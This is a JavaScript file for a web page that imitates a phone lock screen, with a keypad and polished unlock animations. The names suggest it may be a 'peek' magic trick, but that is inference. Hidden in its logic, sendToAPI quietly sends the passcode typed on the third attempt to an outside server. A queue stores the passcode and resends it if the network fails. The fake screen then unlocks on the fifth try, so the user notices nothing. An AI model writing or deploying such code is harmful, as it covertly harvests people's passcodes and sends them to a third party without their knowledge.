(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  // keep a live reference to the cancel node (we may replace listeners later)
  let cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
    updateCancelText();
  }

  function reset() {
    code = "";
    refreshDots();
    updateCancelText();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (semi-implicit integrator) ---------- */
  // options: { from, to, velocity (optional), mass, stiffness, damping, onUpdate, onComplete, threshold }
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120; // k
    const damping = opts.damping ?? 14;      // c
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000); // cap dt to avoid big jumps
      last = now;
      // Hooke's law + damping: a = (-k*(x - target) - c*v) / m
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        // ensure final snap
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId); // return a cancel function
  }

  /* ---------- playUnlockAnimation uses two springs ---------- */
  function playUnlockAnimation() {
    // Respect reduced-motion
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    // reveal the homescreen image layer immediately (it will animate)
    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      // instant fallback
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    // compute numeric pixel target for lock translate
    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08); // move a bit past top

    // start state
    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';
    // ensure initial styles
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';

    // shadow visual: apply large shadow while animating
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    // spring for lock Y (pixels)
    const cancelLock = springAnimate({
      from: 0,
      to: targetY,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => {
        // val is pixels from 0 -> targetY (negative)
        // map to scale slight (small effect)
        const progress = Math.min(1, Math.abs(val / targetY)); // 0..1
        const scale = 1 - 0.003 * progress; // tiny shrink while lifting
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        // fade a bit as it goes
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        // remove shadow and hide inner off-screen (keep homescreen shown)
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        // keep transform at final position (or clear if you prefer)
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    // spring for homescreen (scale & exposure)
    // We'll animate a small overshoot scale and sharpen (blur -> 0)
    const cancelHome = springAnimate({
      from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
      to: 1,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        // p will progress 0 -> 1 but spring oscillates; clamp for mapping
        const progress = Math.max(0, Math.min(1, p));
        // map to scale overshoot: 0->1 maps to 0.96 -> 1.04 -> 1
        // We'll use a simple mapping from progress to scale; because spring oscillates around 1, p may overshoot <0 or >1: handle it
        const raw = p; // spring value
        // convert to scale via interpolation around 1
        const scale = 1 + (raw - 1) * 0.12; // gives slight overshoot (e.g. if raw = 1.2 -> scale ~1.024)
        // clamp reasonable range
        const finalScale = Math.max(0.96, Math.min(1.06, scale));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;

        // blur mapping: when raw small -> blurry, when near 1 -> sharp
        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
        const sat = 0.9 + Math.min(0.15, raw * 0.15);
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw)); // fade in quickly
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });

    // Optional: cleanup both springs after a timeout (in case onComplete didn't fire)
    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1200);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;

    // Force button back to "Cancel" while the shake runs
    if (cancelBtn) {
      cancelBtn.textContent = 'Cancel';
    }

    dotsEl.classList.add('wrong');
    reset(); // reset also updates cancel text
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    if (attempts === 3) {
      sendToAPI(enteredCode);
      animateWrongAttempt();
    } else if (attempts === 5) {
      playUnlockAnimation();
      setTimeout(reset, 300);
    } else {
      animateWrongAttempt();
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  /* ---------- Cancel / Delete label logic ---------- */
  function updateCancelText() {
    // If node reference got replaced earlier, refresh it
    cancelBtn = document.getElementById('cancel') || cancelBtn;
    if (!cancelBtn) return;
    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
  }

  // replace existing cancel listener (clone node to remove prior listeners safely)
  function wireCancelAsDelete() {
    const old = document.getElementById('cancel');
    if (!old) return;
    const cloned = old.cloneNode(true);
    old.parentNode && old.parentNode.replaceChild(cloned, old);
    cancelBtn = document.getElementById('cancel');
    cancelBtn.addEventListener('click', (e) => {
      e.preventDefault();
      // if digits present -> delete last digit
      if (code.length > 0) {
        code = code.slice(0, -1);
        refreshDots();
        updateCancelText();
      } else {
        // otherwise keep original cancel behaviour (reset)
        reset();
      }
    });
  }

  wireCancelAsDelete();
  updateCancelText();

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    // On pointer/touch start we brighten the key — also update Cancel text immediately
    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
      // show Delete immediately when user touches a key (makes it snappy)
      updateCancelText();
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    // Click handler (adds the digit)
    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      // update Cancel -> Delete as soon as first digit is present
      updateCancelText();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
